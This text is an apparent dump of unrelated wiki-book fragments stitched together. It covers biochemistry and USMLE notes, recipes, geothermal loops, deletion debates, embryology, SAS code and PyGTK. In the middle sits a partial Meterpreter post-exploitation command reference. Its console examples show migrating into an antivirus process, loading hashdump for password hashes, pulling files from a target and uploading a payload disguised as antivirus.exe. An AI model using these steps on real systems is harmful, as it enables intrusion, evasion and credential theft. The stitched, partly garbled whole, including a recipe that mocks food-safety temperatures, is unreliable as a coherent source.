*Liver:  glycogen synthesis;  glucose production by inhibiting gluconeogenesis &amp; glycogenolysis;  triacylglycerol synthesis &amp; conversion to VLDL.
*Muscle:  glycogen synthesis;  glucose uptake by increasing the number of glucose transporters.
*Adipose tissue:  triacylglycerol degradation &amp;  triacylglycerol synthesis;  glucose uptake by increasing the number of glucose transporters.
*Most tissues:  entry of amino acids into cells &amp;  protein synthesis.
*Insulin does NOT significantly stimulate the transport of glucose into tissues such as liver, brain, &amp; RBCs.
 
14. Effect of uncouplers on oxidative phosphorylation (Lippincott p 71).
*Compounds that increase the permeability of the inner mitochondrial membrane to protons can uncouple electron transport and phosphorylation.
*The energy produced by the transport of electrons, without a proton gradient, is released as heat rather than being used to synthesize ATP.
*2,4-dinitrophenol, a lipophilic proton carrier that readily diffuses through the membrane, is an uncoupler.
*Aspirin in high doses (as well as other salicylates) is an uncoupler. This explains the fever that accompanies the toxic overdoses of these drugs.
*Uncoupling is different that just inhibiting electron transport, like cyanide does.

The USMLE Step 1 consists of multiple-choice questions prepared by examination committees composed of faculty members, teachers, investigators, and clinicians. Committee members are selected to provide broad representation from the academic, practice, and licensing communities across the United States and Canada. 

The test is designed to measure basic science knowledge. Some questions test the examinee's fund of information per se, but the majority of questions require the examinee to interpret graphic and tabular material, to identify gross and microscopic pathologic and normal specimens, and to solve problems through application of basic science principles. 

Step 1 is constructed from an integrated content outline that organizes basic science content according to general principles and individual organ systems. Test questions are classified in one of these major areas depending on whether they focus on concepts and principles that are important across organ systems or within individual organ systems. Sections focusing on individual organ systems are subdivided according to normal and abnormal processes, principles of therapy, and psychosocial, cultural, and environmental considerations. 

Each examination covers content related to the traditionally defined disciplines of anatomy, behavioral sciences, biochemistry, microbiology, pathology, pharmacology, and physiology, as well as interdisciplinary areas including genetics, aging, immunology, nutrition, and molecular and cell biology. While not all topics listed in the content outline are included in every examination, overall content coverage is comparable in the various examination forms that will be taken by different examinees. 

The Step 1 Content Outline describes the scope of the examination in detail, but it is not intended as a guide for curriculum development or examinee preparation. It provides a flexible structure for test construction that can readily accommodate new topics, emerging content domains, and shifts in emphasis. 

The categorizations and content coverage are subject to change. Broadly based learning that establishes a strong general understanding of the concepts and principles in the basic sciences is the best preparation for the examination. 

The most popular and most used resource that students currently use to prepare for the USMLE is the ''First Aid to the USMLE Step 1''.

Everyone knows that a Monte Cristo sandwich is sort of a French toast sandwich, only savory, so I combine it with America's favorite ground beef dish, the burger.

== Ingredients ==
* 1 pound 80/20 ground chuck
* Salt and freshly ground [[Cookbook:Pepper|black pepper]]
* [[Cookbook:Olive Oil|Olive oil]]
* 4 hamburger buns, halved
* Few shots of hot sauce
* 1 egg, beaten
* 2 tbsp heavy cream
* 4 slices cheese, any cheese you like
* Nonstick cooking spray

== Procedure ==
#Preheat oven to 200 degrees.
#Combine the egg, hot sauce, and cream in a pie plate. Dip cut sides of buns into egg mixture. Move to a cooling rack and let sit 10 minutes.
#Heat a medium nonstick skillet over medium heat. Grease with nonstick cooking spray.
#Add buns, one at a time, and cook until browned on cut side. Move to a clean plate and repeat until all buns have been cooked. Keep warm in the oven.
#Form beef into 4 equal patties. Brush both sides with olive oil and sprinkle both sides liberally with salt and freshly ground black pepper.
#Heat about 28 charcoal briquets in a large chimney starter. Once hot, disperse evenly around the bottom of the grill and reapply grate. Add patties and cook, turning often, until internal temperature reaches 145 degrees F for medium rare, 160 for medium, and 170 for toast (I know people think that's the only way to be safe, but I'm taking my chances. Screw those feds.). 
#Remove to a plate, top with cheese, and cover with aluminum foil. Let rest 3 minutes.
#Place a patty on the bottom half of each bun. Top with upper half and serve warm.</text>

      <text xml:space="preserve">&lt;p style=&quot;text-align:center;&quot;&gt;&lt;b&gt;Ground Loops and Open Loop Sources&lt;/b&gt;&lt;/p&gt;

The primary difference between Ground Source Heat Pumps and Air to Air heat pumps, is where we get/send the heat from/to. A Ground Source Heat Pump gets the heat from or sends the heat to the ground, whereas an air to air heat pump gets and sends the heat to the air. The equipment at the heat pump is slightly different because it uses a water to refrigerant coil, instead of a air to refrigerant coil, but once the primary coil is taken care of the heat pump systems are not all that different.

The greater efficiencies available with ground Source Heat pumps are therefore to do with the Ground Loop and how efficiently it allows the heat pump to work. There are two reasons why a Ground Source heat pump is more efficient, Ground Tempering, and Fluid Capacity for heat.

Ground Tempering, is caused because the ground does not act as a perfect conductor for heat, and thus, the temperature of the air above the ground goes through a wider range than the temperature of the ground itself.

Fluid Capacity for heat, has to do with how well a fluid/gas will carry heat. Air has much less capacity for storage of heat than water does, because of its gasseous state. The difference is quite large, and as a result systems that transfer heat with water can transfer more heat more quickly than systems that must rely on air as the transfer medium.

Since what we are interested in, in Geothermal heating and cooling is the efficiency of transfer of the heat, and therefore the increase in efficiency over other methods, using a fluid like water is a critical component to the raise in efficiency of the Geothermal system.

Once we have decided on a transfer medium, (Air or Water), the next thing, is how to transfer the heat from a source outside the building into the building. It might be possible to use an Air system to transfer heat from the ground, but that would require a large amount of air to be moved in order to do the transfer. A much smaller amount of water can be used and so the Ground Loop is designed to work with water.

Heat transfer from a location within the ground relies on three things:

# How much surface area the transport medium has with the ground
# How much heat conduction the ground has around the ground loop
# What the temperature of the soil is at the time of transfer

The more surface area there is, the greater the heat transfer, the greater the conduction of the ground the more heat transfer, and the more radical the difference in temperature the more heat will be transferred.

Since the temperature of the ground stays relatively the same at each latitude, and lags the air temperature more the further towards the poles you go, we can say that the difference between the outside air and the ground temperature gets larger the more polar your latitude. Thus the ground loop itself is more efficient the more polar your latitude.

It should be noted that because water has more heat conduction capabilities than most types of ground, that swampy areas, and areas with high water tables are more efficient than dry sandy soil for ground loops.

For this reason many have been tempted to place their ground coils in rivers streams and lakes. The main objection to this practice is that removing heat from a fish habitat, will result in reducing the size of the habitat, and therefore the number of fish it can support. For instance it can be seen that putting a ground loop in a lake, will cause the ice depth to increase in that lake, and if the lake is small enough and enough ground coils are put into the lake, the effect will be to freeze the lake to the bottom killing off all the fish. For this reason the number of ground coils that are placed into a lake should be limited.

It might seem that since water is a better conductor of heat, that geothermal heat should be taken from a stream or well, and in some cases it has been done successfully with little ecological impact. However one of the problems with an open loop system, is that contaminants from the mechanical components of the system can penetrate an otherwise pristine environment, also if the installation is not done carefully enough, it can result in cross contamination between watersheds, etc. It is considered better form to keep the contaminants within the loop, by closing the loop. Besides closing the loop allows us to use anti-freeze and in sub-polar and polar climates, antifreeze is a must. The antifreeze used should be chosen to minimize ecological hazard in the case of a spill or crack in the water pipes.

This still doesn't mean that you can't use a stream or a well, in fact vertical ground loops are often achieved by digging a well, and putting a loop down it, sealing the water into its own strata by using parging to seal between strata. Parging for vertical loop systems is a legal requirement in some jurisdictions and so special techniques have been developed to make it easy to achieve.

In any case there are not enough rivers streams and lakes available for everyone to be able to use this technique, so it is an exception rather than the rule. Instead most ground loops are simply based on extraction of heat from the ground itself.

If you check its creator's userpage, it basically says that he made up &quot;Hexpixel code&quot; himself.  Technically [[WB:OR|OR]].  A Google search reveals the only existence of &quot;Hexpixel code&quot; is on Wikibooks, so it's probably not real.  Although it looks like a real thing, this book is basically a &quot;toy&quot; exercise, not an actual computer tool.  It's not a computer language in any sense, it's just a fictional image format. &lt;font color=&quot;#000090&quot;&gt;[[User:NipplesMeCool|Mr.&amp;nbsp;'''NMC''']]&lt;/font&gt; (&lt;font color=&quot;#000090&quot;&gt;[[User talk:NipplesMeCool|talk]]&lt;/font&gt;) 01:42, 25 May 2009 (UTC)
:[[Image:Symbol redirect vote.svg|15px]] '''Transwiki''' to Wikiversity. I strongly object with the proposing user defining another Wikibookian constructive work as BS (don't know if NMC was pressed on time to find a better wording but a VFD is a high visibility discussion, making this type of criticism an highly effective way of alienating people from the project). The author did not misrepresent the issue and seems to be only in fault regarding to the best place to hosts his creation. There is no mentioning of programing at all on the text, it describes a code and the process of it for the encoding of image data. I agree that the content seems to be OR. The book was last active in April 2009 so a reshaping or constructive criticism may still address any of the issues. I only see a future for it on the project if turned into a practical example of some sort.  --[[User:Panic2k4|Panic]] ([[User talk:Panic2k4|talk]]) 04:30, 25 May 2009 (UTC)
:: Sorry about the wording, changed. (The book was categorized under &quot;Assembly Language&quot;, btw.) -- &lt;font color=&quot;#000090&quot;&gt;[[User:NipplesMeCool|Mr.&amp;nbsp;'''NMC''']]&lt;/font&gt; (&lt;font color=&quot;#000090&quot;&gt;[[User talk:NipplesMeCool|talk]]&lt;/font&gt;) 20:00, 25 May 2009 (UTC)

:: I did a bad job explaining myself.  Let me retry:  the book explains a &quot;language&quot; for encoding an image.  However, there is no software that actually uses that code.  It's made up, is what I meant to say.  It's as if someone made up their own language, but nobody else speaks it, and then wrote a Wikibook about it.  It has no practical/educational value.  Also, the book ''does'' misrepresent itself, because it implies that Hexpixel Code is a usable image format, even though there is no software that uses it. -- &lt;font color=&quot;#000090&quot;&gt;[[User:NipplesMeCool|Mr.&amp;nbsp;'''NMC''']]&lt;/font&gt; (&lt;font color=&quot;#000090&quot;&gt;[[User talk:NipplesMeCool|talk]]&lt;/font&gt;) 20:23, 25 May 2009 (UTC)
:::&lt;u&gt;We already agreed in the OR issue&lt;/u&gt; (and I think your are proposing the deletion of the content) but I still don't think it does &quot;misrepresent itself&quot; (by error or intention) since the book is about a practical example on using a particular constructed code, there is no particular need to have it be implemented in a program (it could be, but not as a requirement to make the construct valid), the viability of the concept seems to be &quot;proven&quot; (didn't check it) on the text by way of a practical example, it is NPOV, since it doesn't try to sell you the format. It is only a very simple demonstration (it only does the encoding) presumably the decoding would be the reversal of the steps in a way a non programmer can fallow it.
:::The problem is that by itself it isn't right for Wikibooks (but would be acceptable if used to demonstrate a programming language implementing the same steps as part of another book, as programming exercise) or even as part of a book covering image formats or something that runs parallel to the text, like turning it an easy to fallow demonstration of an algorithm.  --[[User:Panic2k4|Panic]] ([[User talk:Panic2k4|talk]]) 22:50, 25 May 2009 (UTC)
:::: My reasoning is that the book is essentially fiction.  There is no such thing as Hexpixel code, except for within this book.  As shown by the very first sentence of the book, its purpose it to teach the reader how to use Hexpixel Code (something that doesn't exist).  What if I made up my own variation of [[w:Pig latin|Pig Latin]] that I spoke with my friends, and then I made a wikibook for it?  It would get deleted.
:::: I don't wish to drag this out or turn this into a battle, so I'm not going to reply again. Other people can decide.  --&lt;font color=&quot;#000090&quot;&gt;[[User:NipplesMeCool|Mr.&amp;nbsp;'''NMC''']]&lt;/font&gt; (&lt;font color=&quot;#000090&quot;&gt;[[User talk:NipplesMeCool|talk]]&lt;/font&gt;) 01:06, 26 May 2009 (UTC)

Main contributor threw this together over 20 minutes on May 31, 2006, then left after the final edit.  The formatting leaves much to be desired, but most importantly, the text on the entire page is mangled (I see &quot;failed to parse&quot; multiple times).  Some of it looks like LaTeX was pasted in.  From the introduction, it's apparent that the &quot;paper&quot; (as the author refers to it) is not complete, with only the first two sections there.  On &quot;original research&quot;, I see a reference to [[w:Action description language|Action description language]] in the body, but I couldn't say if the paper itself is original research or not.  I don't expect the original author to finish it and the poor wording, coding, and math formula creation have dissuaded anyone else from contributing in the three years since. -- [[User:Adrignola|Adrignola]] &lt;sup&gt;[[User talk:Adrignola|talk]] [[Special:Contributions/Adrignola|contribs]]&lt;/sup&gt; 05:05, 4 June 2009 (UTC)

: [[File:Symbol redirect vote.svg|15px]] '''Move to Wikiversity''' if anyone can make some sense of it and think it might be work salvaging. This looks like it might be a research paper, a proposal for planned research, or an attempt to get funding for research. --&lt;span style=&quot;font: bold 10pt 'courier new', comic, sans, ms;&quot;&gt;[[User:Darklama|&lt;font color=&quot;midnightblue&quot;&gt;dark&lt;/font&gt;]][[User_talk:Darklama|&lt;font color=&quot;green&quot;&gt;lama&lt;/font&gt;]]&lt;/span&gt; 12:27, 4 June 2009 (UTC)

I call them tiramisu paninis because they have all the flavors of tiramisu: mascarpone cheese, the bread is soaked in coffee, and it's dusted with cocoa powder.

== Ingredients ==
:8 slices white bread, toasted
:Mascarpone cheese
:1 1/4 cups strong coffee or espresso, cooled
:Cocoa powder
:Hazelnut oil

== Directions ==
#In a 13x9 roasting pan, pour in coffee. Add bread slices and add a weight if they float. Let sit 1/2 hour.
#Remove bread from pan and discard any remaining coffee.
#Toast bread again.
#Spread slices of bread liberally with mascarpone cheese.
#Attach 2 slices of bread to each other, cheese facing in. Brush outside liberally with hazelnut oil.
#Heat a grill pan over medium high heat. Add sandwiches, working in batches if needed, and cook until brown on both sides and cheese is melted. Dust with cocoa powder, drizzle with hazelnut oil, and serve warm.</text>

      <text xml:space="preserve">== I don't follow the last step in this proof ==

The last step of this proof seem to suppose that if &lt;math&gt;P(|\overline{X}_n-\mu|&lt;\epsilon) \rightarrow 1&lt;/math&gt; then &lt;math&gt;\overline{X}_n \rightarrow \mu&lt;/math&gt;. Can someone explain this step for me? What about for example if it happens to be that &lt;math&gt;X_i = \mu + \frac{1}{2}\ \!\epsilon, 1 \leq i \leq n,&lt;/math&gt; then still &lt;math&gt;P(|\overline{X}_n-\mu|&lt;\epsilon) \rightarrow 1&lt;/math&gt; but &lt;math&gt;\overline{X}_n \rightarrow \mu + \frac{1}{2}\ \!\epsilon \neq \mu?&lt;/math&gt;

:I think the confusion is coming about because in the proof we have that &lt;math&gt;P(|\overline{X}_n-\mu|&lt;\epsilon) \rightarrow 1&lt;/math&gt; for every &lt;math&gt;\epsilon&lt;/math&gt;, epsilon is fixed by the values of &lt;math&gt;X_i&lt;/math&gt;.

=Introduction=

TODO - meterpreter introduction.

=Getting Started=


=Commands=


==Core Commands==

===?===

We can use ''?'' or ''help'' to show a list of commands with brief descriptions.

===background===

Using the ''background'' command places the current session into the background and brings us back to the Metasploit console without terminating the session.  We can begin to interact with the session again by using the ''sessions'' Metasploit command.

 meterpreter &gt; '''''background'''''
 msf exploit(handler) &gt; '''''sessions -l'''''
 
 Active sessions

 meterpreter &gt;

===channel===

TODO Displays information about active channels

===close===

TODO Closes a channel

===exit===

Returns to the Meterpreter console and closes the active session.

 meterpreter &gt; '''''exit'''''
 
 [*] Meterpreter session 1 closed.
 msf exploit(handler) &gt; '''''sessions -l'''''
 
 Active sessions
 ===============
 
 No active sessions.

===help===

We can use ''?'' or ''help'' to show a list of commands with brief descriptions.

===interact===

TODO Interacts with a channel

===irb===

We can start the Interactive Ruby Shell with the ''irb'' command, allowing us to use the Ruby scripting language to interact with the compromised system.

To view the API, we need to run the ''rdoc'' command from the Metasploit directory, which will create a doc/index.html file that we can open with a browser.  View the Rex::Post::Meterpreter section of the API for the relevant section.

 meterpreter &gt; '''''irb'''''
 [*] Starting IRB shell
 [*] The 'client' variable holds the meterpreter client
 
 &gt;&gt; '''''client.sys.config.sysinfo()'''''
 =&gt; {&quot;OS&quot;=&gt;&quot;Windows XP (Build 2600, Service Pack 2).&quot;, &quot;Computer&quot;=&gt;&quot;TARGETLAPTOP&quot;}

===migrate===

Meterpreter initially runs inside the exploited process or as its own executable's process in some cases.  If that process is stopped for any reason, the Meterpreter session will close, so it is good practice to ''migrate'' the session to more stable process such as Windows' explorer.exe.

The following example shows the use of a handful of commands in order to locate a process that the user will not close during his or her session.  The commands are:

# ''ps'' - Show a list of running processes.
# ''getpid'' - Display the process Meterpreter is using, which shows an EXE payload meter-443.exe.
# ''migrate pid'' - Move Meterpreter to a new process ID number, where we request the McAfee agent.
# ''getpid'' - Display the new process Meterpreter is using, which we verify is the McAfee agent process.

===read===

TODO Reads data from a channel

===run===

We can execute a Meterpreter script using the ''run'' command.  If no path is specified, Meterpreter will search for the script in the scripts/meterpreter/ directory.

In the following example we are running the scripts/meterpreter/scraper.rb script, which pulls some basic information from the target.  The information is logged to the ~/.msf3/logs/scraper directory.

 meterpreter &gt; '''''run scraper.rb'''''

===use===

For additional commands and functionality we can load Meterpreter extensions with the ''use'' command.

In the following example, we would like to use the ''hashdump'' command to retrieve password hashes from the target.  By using the ''use priv'' command we can load the extension that gives us the ''hashdump'' command.  We can verify this by using ''?'' to list our available commands.

 meterpreter &gt; '''''use -l'''''
 stdapi
 sniffer
 incognito

     timestomp     Manipulate file MACE attributes

===write===

TODO Writes data to a channel

==File System Commands==


===cat===

The ''cat'' command displays the contents of a single file.  As of the time of this writing, the command will throw an error when trying to read an emtpy file.

 meterpreter &gt; '''''cat passwords.txt'''''
 harleydavidson
 password
 kidsbirthday

===cd===

To change directory the ''cd'' command is used.

The command will accept both back and forward slashes somewhat interchangeably, though using a forward slash seems to work more frequently.  &quot;.&quot; and &quot;..&quot; are used to access the current and parent directory, respectively, and double-quotes can be used to access directories with spaces in the names.

 meterpreter &gt; '''''pwd'''''
 C:\
 meterpreter &gt; '''''cd /&quot;Program Files&quot;/&quot;Internet Explorer&quot;'''''
 meterpreter &gt; '''''pwd'''''
 C:\Program Files\Internet Explorer
 meterpreter &gt; '''''cd ../../&quot;documents and settings&quot;/Administrator/Desktop/'''''
 C:\Documents and Settings\Administrator\Desktop

===download===

When we need to retrieve a file from the target we use the ''download'' command, which transfers the specified file into our local working directory.  In the event that we need to recursively download an entire directory, we use the ''download -r'' command.

 meterpreter &gt; '''''download users.txt'''''
 [*] downloading: users.txt -&gt; users.txt
 [*] downloaded : users.txt -&gt; users.txt

===edit===

To edit a file using our default text editor we use the ''edit'' command.  Behind the scenes, Meterpreter will download a copy of the file to a temp directory, then upload the new file when the edit is complete.

 meterpreter &gt; '''''edit users.txt'''''

===getlwd===

We can show the current working directory on our local machine by using ''getlwd'' (get local working directory), or by using the alias ''lpwd'' (local print working directory).

 meterpreter &gt; '''''getlwd'''''
 /home/myusername/Desktop/metasploit
 meterpreter &gt; '''''lpwd'''''
 /home/myusername/Desktop/metasploit

===getwd===

We can show the current working directory on the exploited machine by using ''getwd'' (get working directory), or by using the alias ''pwd'' (print working directory).

 meterpreter &gt; '''''getwd'''''
 C:\Program Files\Internet Explorer
 meterpreter &gt; '''''pwd'''''
 C:\Program Files\Internet Explorer

===lcd===

To change the local directory we use the ''lcd'' command.

The command only accepts arguments in the same way as your operating system's cd command, so refer to your system's documentation for specific instructions.  The following example shows ''lcd'' on a Linux system.

 meterpreter &gt; '''''lpwd'''''
 /home/myusername/Desktop/metasploit
 meterpreter &gt; '''''lcd ../..'''''
 meterpreter &gt; '''''lpwd'''''
 /home/myusername
 meterpreter &gt; '''''lcd /home/andrer/Desktop/metasploit'''''
 meterpreter &gt; '''''lpwd'''''
 /home/myusername/Desktop/metasploit

===lpwd===

We can show the current working directory on our local machine by using ''lpwd'' (local print working directory), or by using the alias ''getlwd'' (get local working directory).

 meterpreter &gt; '''''lpwd'''''
 /home/myusername/Desktop/metasploit
 meterpreter &gt; '''''getlwd'''''
 /home/myusername/Desktop/metasploit

===ls===

We can see both the current working directory and a detailed listing of files in that directory by using the ''ls'' command.  File listings are given in a format similar to the GNU ls program.

 meterpreter &gt; '''''ls'''''

===pwd===

We can show the current working directory on our local machine by using ''pwd'' ( print working directory), or by using the alias ''getwd'' (get working directory).

 meterpreter &gt; '''''pwd'''''
 C:\Program Files\Internet Explorer
 meterpreter &gt; '''''getwd'''''
 C:\Program Files\Internet Explorer

===rmdir===

We can remove an empty directory with the ''rmdir'' command.  The command will throw an error if the directory is not empty.

 meterpreter &gt; '''''rmdir antivirus-update'''''
 Removing directory: antivirus-update

===upload===

To send a file to the target system we use the ''upload'' command, using the -r switch to recursively upload directories and their contents.  In the following example we are uploading a falsely named Meterpreter payload.

 meterpreter &gt; '''''upload antivirus.exe'''''
 [*] uploading  : antivirus.exe -&gt; antivirus.exe
 [*] uploaded   : antivirus.exe -&gt; antivirus.exe

==Networking Commands==

===ipconfig===

By using the ''ipconfig'' command, or '''i'''nternet '''p'''rotocol '''config'''uration, we can view a listing of all network interfaces on the target.  Viewing the results for ''ipconfig'' is most useful for determining to which networks the target is directly connected.

For example, looking at the following we can see that the target is connected to the 192.168.50.0/24 network, with an internal address of 192.168.50.100.

 meterpreter &gt; '''''ipconfig'''''
 
 MS TCP Loopback interface
 Hardware MAC: 00:00:00:00:00:00
 IP Address  : 127.0.0.1
 Netmask     : 255.0.0.0

 Hardware MAC: 00:0b:cd:30:db:0a
 IP Address  : 192.168.50.100
 Netmask     : 255.255.255.0

===portfwd===

Forward a local port to a remote service  

===route=== 

View and modify the routing table

==System Commands==

===execute===

Execute a command

To execute a command you need to use execute &quot;-f&quot; for file &quot;cmd.exe&quot; application

This will be executed in the background. To check this type ps

'''execute -f cmd.exe'''
54124---&gt; process id

===getpid===

Get the current process identifier                    

===getuid===

Get the user that the server is running as            

===kill===

Terminate a process                                   

===ps===

The ''ps'' command lists the running processes, and is an important command for a couple reasons.  First, it is a good idea for us to be aware of applications and services running on the target in order to have awareness of the system.  Secondly, Meterpreter initially runs inside the exploited process or as its own executable's process in some cases. If that process is stopped for any reason, the Meterpreter session will close, so it is good practice to migrate the session to more stable process such as Windows' explorer.exe.

      <comment>/* Embryogenesis */</comment>
      <text xml:space="preserve">'''Embryology''' is the study of embryonic and fetal development, an understanding of which is required for the USMLE Step 1. Though embryology is a vast area of study, the USMLE requires only a very basic understanding; these can be summarized in a few basic principles about development and augmented with some details about embryology relevant to particular disease conditions.

==General principles==
===Embryogenesis===
Sperm + oocyte → zygote → proliferation → blastomere → blastocyst → inner cell mass (embryoblast) + trophoblast differentiation
: Inner cell mass (embryoblast) →
:: Epiblast → embryo, amnion
:: Hypoblast → yolk sac
: Trophoblast → syncytiotrophoblast + cytotrophoblast → placenta

===Germ layers===
Epiblast → endoderm, mesoderm, ectoderm

==Clinical relevance==
===Malrotation===
Intestinal structures outgrow abdominal cavity → forced outside abdominal cavity → return at ~10 weeks → rotate into final position. Failure of proper rotation results in malrotation.

===Meckel's diverticulum===
True diverticulum of distal ileum, formed by remnant of vitelline (omphalomesenteric) duct. Gut is formed when trilaminar disk folds in on itself, coopting yolk sac to make gut tube; omphalomesenteric duct is communication between midgut and yolk sac, which normally obliterates. Failure of obliteration → Meckel's diverticulum. Rule of 2s: 2% of population, 2% symptomatic, 2 inches long, 2 feet from ileocecal valve, 2 types of tissue (pancreatic/gastric). Associated with abdominal pain, lower GI bleeding. 99m-Technetium (Meckel's) scan identifies ectopic gastric tissue. May lead to volvulus, intussusception, obstruction.

===Cryptorchidism===
Failure of testicular descent by 1 year → cryptorchidism. Testes derive from embryonic kidney (retroperitoneal) → descend via gubernaculum → internal inguinal ring → scrotum. Cryptorchid testis can be found anywhere along this path.

===Branchial cleft cysts===
Branchial structures include clefts, arches, and pouches. Clefts are ectodermal, arches mesodermal, and pouches endodermal. Most have an associated nerve, skeletal structures, and muscles worth remembering. Clefts II-IV are meant to obliterate; when this does not occur, a branchial cleft cyst or sinus may occur, which is a lateral structure of the neck.

===Persistent thyroglossal duct===
Base of tongue → foramen cecum → thyroid → produces thyroglossal duct as it migrates to neck → duct normally obliterates, leaving '''pyramidal lobe''' as remnant. Failure of duct obliteration can lead to persistent thyroglossal duct or thyroglossal duct cyst, the most common cause of a midline neck mass.

===Germ cell tumors===
Primordial germ cells originate in yolk sac, then migrate along the embryo's midline longitudinal axis to the gonadal ridge. Migration can go awry, and may lead to germ cell tumors (eg, teratomas), which are frequently midline.

===Kartagener's syndrome===
Kartagener's syndrome, also called [[:wikipedia:primary ciliary dyskinesia|primary ciliary dyskinesia]], is associated with situs inversus (organs on the wrong side of the body), infertility, and recurrent lung infections due to bronchiectasis, among other things -- all resulting from a loss of cilia. The situs inversus is most interesting in the discussion of embryology. During embryogenesis, the [[:wikipedia:sonic hedgehog|sonic hedgehog]] (Shh) protein is partly responsible for determining which side of the body an organ should develop on (eg, the liver, heart, spleen). Normally, cilia sweeps Shh to one side of the developing embryo to help signal this sidedness. In primary ciliary dyskinesia, the dynein arms of cilia are dysfunctional and thus cilia malfunction. Thus the normal sweeping motion is impossible and the Shh sidedness signal is lost, resulting in inversion of these organs' normal position.

For those of you in the good ol' US, this recipe is a lot easier to follow than the other recipe on this book.

== Ingredients ==
* 1 boneless pork loin roast
* 1 cup salt
* 3/4 cup honey
* 2 cups hot apple cider vinegar
* 1 pound ice
* 2 cups cornbread, crumbled finely
* 1/2 cup ricotta cheese
* 1/4 cup dried cranberries
* 3/4 cup apple jelly
* 1/2 cup dried apple rings, finely diced
* 1/2 cup walnuts
* 1 tbs black peppercorns
* 6-8 cloves garlic, smashed and minced
* 1/2 cup shredded mozzarella cheese
* 1/2 cup shredded Monterrey Jack cheese
* 4 eggs, beaten

== Procedure ==
#Combine salt, honey, vinegar, peppercorns, and garlic in a gallon size zip-top bag. Add ice and shake until ice is almost completely melted and mixture has cooled down. Add pork and refrigerate 2 1/2-3 hours.
#Meanwhile, combine remaining ingredients except mozzarella and Jack cheese. Pour into a 9x9 baking pan and sprinkle with remaining ingredients. Bake in the center of a 400 degree F oven 30-35 minutes or until browned and bubbly on top. Remove and keep warm.
#Place pork roast on a roasting rack in a roasting pan and insert a probe thermometer into the center. Bake at 375 degrees F until internal temperature reaches 140 degrees for medium rare. Remove to a plate and let rest 10 minutes.

* PROC NLMIXED allows you to specify your likelihood

&lt;source lang=&quot;SAS&quot;&gt;
proc nlmixed data = recidiv ;
parms cst = 0 b_male = 0 b_black = 0 b_release =0 b_age = 0;
xb = cst + b_male*male + b_black*black + b_release*release + b_age*age__days_1000_ ; 
if c = 1 then prob = exp(-exp(xb)*y);
if c = 0 then prob = exp(xb)*exp(-exp(xb)*y);
ll= log(prob);
model y ~ general(ll);
run;
&lt;/source&gt;
* parms gives initial values to the parameters
* xb is an intermediate step which gives the list of covariates
* then we define the likelihood and we specify the model


* One can also use the IML language and use one of the built-in optimizer.</text>

If you look up comfort food in the dictionary, you'll see a picture of this dish. (I was just kidding, but if you want to hear something funny, if you look up dictionary in the dictionary, you'll see a picture of the dictionary) 

== Ingredients ==
* 1 boneless pork loin roast
* 1 cup salt
* 3/4 cup honey
* 2 tbsp cracked black peppercorns
* 2 cups apple cider vinegar, brought to boiling
* 10 sprigs fresh thyme, finely chopped
* 2 pounds ice
* Olive oil
* 2 tbsp all-purpose flour
* 1/2 cup chicken broth

== Procedure ==
#Combine salt, honey, vinegar, peppercorns, thyme, and ice. Pour into a gallon-size zip-top bag and add roast. Refrigerate 3-3/2 hours.
#Drain roast and pat dry with paper towels. Coat roast liberally with olive oil.
#Place on a roasting rack set in a large roasting pan. Insert a probe thermometer and bake in the center of a 425 degree F oven until internal temperature reaches 140 degrees F. 
#Pour drippings from pan and reserve. Keep roast warm at 200 degrees F.
#Skim fat from drippings and pour 2 tablespoons into a large saucepan. Heat over medium high heat. Add flour and cook, whisking continuously, until mixture turns blond in color.
#Add skimmed drippings and chicken broth and bring to a boil. Cook until slightly thickened.
#Reduce heat to low and cook until slightly thinner than desired consistency. If the gravy gets too thick, add some more chicken broth.
#Slice pork as thick or as thin as you like, and drizzle with gravy.</text>

Savory grilled chicken and spicy arugula dressed with a citrus vinaigrette is sure better than that goop soaked in separated sludge that they sell down at the supermarket.

== Ingredients ==
* 2 boneless skinless chicken breasts
* 2 cups tightly packed arugula lettuce, roughly chopped
* 2 tbsp freshly squeezed lemon juice
* 1 tsp Dijon mustard
* 6 tbsp extra-virgin olive oil, plus more for the chicken (pick the good stuff)
* Salt and freshly ground black pepper
* Shaved Parmeggiano-Reggiano cheese (always shaved, never grated)

== Procedure ==
#Brush both sides of chicken with extra-virgin olive oil. Season both sides liberally with salt and freshly ground black pepper.
#Grill over a preheated charcoal grill, turning often, until internal temperature reaches 165 degrees F.
#Move to a plate and cover with aluminum foil. Let rest 10 minutes before shredding with two forks.
#Whisk together mustard and lemon juice. Slowly whisk in olive oil. Season, if desired, with kosher salt and freshly ground black pepper.
#Toss chicken with lettuce and dressing. Top with shaved Parmeggianno-Reggiano cheese and serve chilled.

== Notes ==

You probably realized there's no vinegar in our &quot;vinaigrette&quot;. That's because a vinaigrette can use anything for acid, not just vinegar. The definition of vinaigrette is &quot;a basic mixture of acid and fat held together in emulsion, usually with other flavorings&quot;, so technically our &quot;vinaigrette&quot; qualifies as a vinaigrette.</text>

      <text xml:space="preserve">== Isaiah/Introduction ==


The Book of Isaiah is one of the most significant books in the Bible, and is often called the &quot;Gospel of Isaiah&quot; because of the gospel characteristics in its pages. There is no other book in the Hebrew Scriptures that has as many references to the Messiah as in Isaiah. It is cited more than any other Old Testament book except for the book of Psalms.

Um, I'd like to just point out that there are several misunderstandings here when it comes to the pronunciation of Chinese. You can't just say that every &quot;i,&quot; for example, makes the sound of the &quot;i&quot; in the English word &quot;bit.&quot; It changes... for example: xi, shi, and si are all pronounced differently, regardless of the same English &quot;i&quot; being used. Pinyin is far from a perfect system... and this page needs to be altered to reflect that.

Also, 弟弟 (dì di) is pronounced (dee dee)...

      <text xml:space="preserve">__NOTOC__
PyGTK is a module for the Python programming language which allows access to the GTK+ '''G'''raphical '''U'''ser '''I'''nterface ([[w:GUI|GUI]]) toolkit.  From their [http://www.gtk.org/ website]:

:''&quot;GTK+ is a highly usable, feature rich toolkit for creating graphical user interfaces which boasts cross platform compatibility and an easy to use API.&quot;''

With the PyGTK binding, you can create advanced graphical layouts so that your users are able to interact easily with the application, and the [[w:API|API]] (the Application Programming Interface) is itself simple and easy to learn. 

This Wikibook aims to guide existing Python programmers who are new to PyGTK and the GTK+ toolkit in using its functions and classes to build user interface windows and 'widgets' - the term for items inside the window (for example a push button or a text input box) - and linking program functions to the signals generated by the interface.  At the end of the book, we discuss how the creation of GUIs can be made simpler with the Glade XML library and the GTK Designer.

The reader is expected to have knowledge of the Python programming language.  The following books are recommended for beginners:
* [[Non-Programmer's Tutorial for Python 2.6]]
* [[Non-Programmer's Tutorial for Python 3]]
* [http://docs.python.org/tutorial/index.html The Python Tutorial]
* [http://www.diveintopython.net/ Dive Into Python]

